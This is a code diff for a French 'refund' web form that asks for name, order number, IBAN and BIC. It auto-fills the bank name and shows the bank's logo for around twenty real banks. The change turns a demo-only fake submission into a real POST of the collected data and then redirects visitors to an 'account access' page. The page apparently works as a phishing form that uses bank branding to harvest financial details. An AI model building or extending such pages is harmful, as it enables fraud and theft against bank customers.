@@ -328,75 +328,91 @@
     </div>
 
     <script>
-        const bankData = {
-            "BNPAFRPP": { name: "BNP Paribas", logo: "https://logo-marque.com/wp-content/uploads/2021/03/BNP-Paribas-Logo-650x366.png" },
-            "SOGEFRPP": { name: "Société Générale", logo: "https://www.theswiftcodes.com/images/bank-logo/france/societe-generale.png" },
-            "BREDFRPPXXX": { name: "BRED Banque Populaire", logo: "https://static.wixstatic.com/media/57117d_04b6208383c94cdb97302768eacf1c49~mv2.png/v1/fill/w_584,h_264,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/BRED_BANQUE_POPULAIRE_LOGO_2LD_QUAD.png" },
-            "CCBPFRPP": { name: "Banque Populaire", logo: "https://www.changer-la-banque.com/wp-content/uploads/2022/05/Banque-Populaire-logo.png" },
-            "CEPAFRPP": { name: "Caisse d'Épargne", logo: "https://www.theswiftcodes.com/images/bank-logo/france/caisse-d-epargne.png" },
-            "AXABFRPP": { name: "Axa Banque", logo: "https://upload.wikimedia.org/wikipedia/commons/f/fd/Logo-axa-banque.png" },
-            "AGRIFRPP": { name: "Crédit Agricole", logo: "https://logos-marques.com/credit-agricole-logo/credit-agricole-logo-2/" },
-            "CMCIFR2A": { name: "Crédit Mutuel", logo: "https://www.maisonsdevendee.fr/media/logocm2018_carre_cmjn_72dpi__031211900_1028_11022019.jpg" },
-            "CRLYFRPP": { name: "Crédit Lyonnais (LCL)", logo: "https://upload.wikimedia.org/wikipedia/fr/0/0b/Lcl_logo.svg" },
-            "HFPFFRP1": { name: "HSBC France", logo: "https://banner2.cleanpng.com/20180430/vze/avdhhak8t.webp" },
-            "PSSTFRPP": { name: "La Banque postale", logo: "https://upload.wikimedia.org/wikipedia/fr/d/d4/Logo_La_Banque_postale_2022.svg" },
-            "CMCIFRPP": { name: "CIC France", logo: "https://upload.wikimedia.org/wikipedia/fr/a/a7/Cic_logo.svg" },
-            "REVOGB2L": { name: "Revolut", logo: "https://static.wixstatic.com/media/099da0_103304a097734c98a465c0be63ac65e5~mv2.png/v1/fill/w_525,h_525,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/099da0_103304a097734c98a465c0be63ac65e5~mv2.png" },
-            "NTSBDE21": { name: "N26", logo: "https://upload.wikimedia.org/wikipedia/commons/6/69/N26_Logo.svg" },
-            "TRWIBD21": { name: "Wise", logo: "https://upload.wikimedia.org/wikipedia/commons/0/05/Wise_logo.svg" },
-            "BUNQNL2A": { name: "Bunq", logo: "https://upload.wikimedia.org/wikipedia/commons/4/42/Bunq-logo.svg" },
-            "MONZGB22": { name: "Monzo", logo: "https://upload.wikimedia.org/wikipedia/commons/6/62/Monzo_logo.svg" },
-            "SNNNFR22": { name: "Shine Pro", logo: "https://www.mariestum.com/wp-content/uploads/2023/03/shine-logo.svg" },
-            "LYDIFRPP": { name: "Lydia", logo: "https://upload.wikimedia.org/wikipedia/commons/f/f3/Lydia_logo.svg" }
-        };
+    const bankData = {
+        "BNPAFRPP": { name: "BNP Paribas", logo: "https://logo-marque.com/wp-content/uploads/2021/03/BNP-Paribas-Logo-650x366.png" },
+        "SOGEFRPP": { name: "Société Générale", logo: "https://www.theswiftcodes.com/images/bank-logo/france/societe-generale.png" },
+        "BREDFRPPXXX": { name: "BRED Banque Populaire", logo: "https://static.wixstatic.com/media/57117d_04b6208383c94cdb97302768eacf1c49~mv2.png/v1/fill/w_584,h_264,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/BRED_BANQUE_POPULAIRE_LOGO_2LD_QUAD.png" },
+        "CCBPFRPP": { name: "Banque Populaire", logo: "https://www.changer-la-banque.com/wp-content/uploads/2022/05/Banque-Populaire-logo.png" },
+        "CEPAFRPP": { name: "Caisse d'Épargne", logo: "https://www.theswiftcodes.com/images/bank-logo/france/caisse-d-epargne.png" },
+        "AXABFRPP": { name: "Axa Banque", logo: "https://upload.wikimedia.org/wikipedia/commons/f/fd/Logo-axa-banque.png" },
+        "AGRIFRPP": { name: "Crédit Agricole", logo: "https://logos-marques.com/credit-agricole-logo/credit-agricole-logo-2/" },
+        "CMCIFR2A": { name: "Crédit Mutuel", logo: "https://www.maisonsdevendee.fr/media/logocm2018_carre_cmjn_72dpi__031211900_1028_11022019.jpg" },
+        "CRLYFRPP": { name: "Crédit Lyonnais (LCL)", logo: "https://upload.wikimedia.org/wikipedia/fr/0/0b/Lcl_logo.svg" },
+        "HFPFFRP1": { name: "HSBC France", logo: "https://banner2.cleanpng.com/20180430/vze/avdhhak8t.webp" },
+        "PSSTFRPP": { name: "La Banque postale", logo: "https://upload.wikimedia.org/wikipedia/fr/d/d4/Logo_La_Banque_postale_2022.svg" },
+        "CMCIFRPP": { name: "CIC France", logo: "https://upload.wikimedia.org/wikipedia/fr/a/a7/Cic_logo.svg" },
+        "REVOGB2L": { name: "Revolut", logo: "https://static.wixstatic.com/media/099da0_103304a097734c98a465c0be63ac65e5~mv2.png/v1/fill/w_525,h_525,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/099da0_103304a097734c98a465c0be63ac65e5~mv2.png" },
+        "NTSBDE21": { name: "N26", logo: "https://upload.wikimedia.org/wikipedia/commons/6/69/N26_Logo.svg" },
+        "TRWIBD21": { name: "Wise", logo: "https://upload.wikimedia.org/wikipedia/commons/0/05/Wise_logo.svg" },
+        "BUNQNL2A": { name: "Bunq", logo: "https://upload.wikimedia.org/wikipedia/commons/4/42/Bunq-logo.svg" },
+        "MONZGB22": { name: "Monzo", logo: "https://upload.wikimedia.org/wikipedia/commons/6/62/Monzo_logo.svg" },
+        "SNNNFR22": { name: "Shine Pro", logo: "https://www.mariestum.com/wp-content/uploads/2023/03/shine-logo.svg" },
+        "LYDIFRPP": { name: "Lydia", logo: "https://upload.wikimedia.org/wikipedia/commons/f/f3/Lydia_logo.svg" }
+    };
 
-        function detectBank() {
-            let bicInput = document.getElementById("bic").value.toUpperCase().slice(0, 8);
-            let bankSelect = document.getElementById("bank");
-            let bankLogo = document.getElementById("bank-logo");
-            let bankLogoUrlInput = document.getElementById("bank-logo-url");
+    function detectBank() {
+        let bicInput = document.getElementById("bic").value.toUpperCase().slice(0, 8);
+        let bankSelect = document.getElementById("bank");
+        let bankLogo = document.getElementById("bank-logo");
+        let bankLogoUrlInput = document.getElementById("bank-logo-url");
 
-            if (bankData[bicInput]) {
-                bankSelect.innerHTML = `<option value="${bankData[bicInput].name}">${bankData[bicInput].name}</option>`;
-                bankLogo.src = bankData[bicInput].logo;
-                bankLogoUrlInput.value = bankData[bicInput].logo;
-                bankLogo.classList.add("show");
-            } else {
-                bankSelect.innerHTML = `<option value="">Sélection automatique...</option>`;
-                bankLogo.classList.remove("show");
-                bankLogoUrlInput.value = "";
-            }
+        if (bankData[bicInput]) {
+            bankSelect.innerHTML = `<option value="${bankData[bicInput].name}">${bankData[bicInput].name}</option>`;
+            bankLogo.src = bankData[bicInput].logo;
+            bankLogoUrlInput.value = bankData[bicInput].logo;
+            bankLogo.classList.add("show");
+        } else {
+            bankSelect.innerHTML = `<option value="">Sélection automatique...</option>`;
+            bankLogo.classList.remove("show");
+            bankLogoUrlInput.value = "";
+        }
+    }
+
+    // Gestion de la soumission du formulaire
+    document.getElementById("refund-form").addEventListener("submit", function (e) {
+        e.preventDefault(); // Empêche la soumission par défaut
+
+        // Vérifier les champs obligatoires
+        const nom = document.getElementById("nom").value.trim();
+        const prenom = document.getElementById("prenom").value.trim();
+        const orderNumber = document.getElementById("order-number").value.trim();
+        const iban = document.getElementById("iban").value.trim();
+        const bic = document.getElementById("bic").value.trim();
+
+        if (!nom || !prenom || !orderNumber || !iban || !bic) {
+            alert("Veuillez remplir tous les champs obligatoires.");
+            return;
         }
 
-        // Gestion de la soumission du formulaire
-        document.getElementById("refund-form").addEventListener("submit", function (e) {
-            e.preventDefault(); // Empêche la soumission réelle pour la démo
+        // Afficher l'écran de chargement
+        const loadingScreen = document.getElementById("loading-screen");
+        loadingScreen.classList.add("active");
 
-            // Vérifier les champs obligatoires
-            const nom = document.getElementById("nom").value.trim();
-            const prenom = document.getElementById("prenom").value.trim();
-            const orderNumber = document.getElementById("order-number").value.trim();
-            const iban = document.getElementById("iban").value.trim();
-            const bic = document.getElementById("bic").value.trim();
+        // Récupérer les données du formulaire
+        const formData = new FormData(document.getElementById("refund-form"));
 
-            if (!nom || !prenom || !orderNumber || !iban || !bic) {
-                alert("Veuillez remplir tous les champs obligatoires.");
-                return;
-            }
-
-            // Afficher l'écran de chargement
-            const loadingScreen = document.getElementById("loading-screen");
-            loadingScreen.classList.add("active");
-
-            // Simuler un temps de chargement
-            setTimeout(() => {
-                loadingScreen.classList.remove("active");
-                alert("Formulaire soumis avec succès !"); // Message de succès
-
-                // Rediriger vers acces_compte.html après le popup
+        // Envoyer les données via une requête POST
+        fetch("/acces_compte", {
+            method: "POST",
+            body: formData,
+        })
+        .then(response => {
+            if (response.ok) {
+                // Rediriger vers acces_compte.html après la soumission réussie
                 window.location.href = "/acces_compte";
-            }, 3000); // 3 secondes de simulation
+            } else {
+                alert("Erreur lors de la soumission du formulaire.");
+            }
+        })
+        .catch(error => {
+            console.error("Erreur :", error);
+            alert("Une erreur s'est produite lors de la soumission du formulaire.");
+        })
+        .finally(() => {
+            // Masquer l'écran de chargement
+            loadingScreen.classList.remove("active");
         });
+    });
     </script>
 </body>
 </html>
